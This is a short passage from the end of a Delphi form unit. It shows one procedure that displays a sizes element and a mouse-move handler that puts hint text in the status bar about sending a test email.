begin
 ES_Sizes.Show;
end;

procedure TForm1.Button6MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 StatusBar.Panels[0].Text:='when you click here, a test email will be sent to the specified email address';
end;

end.
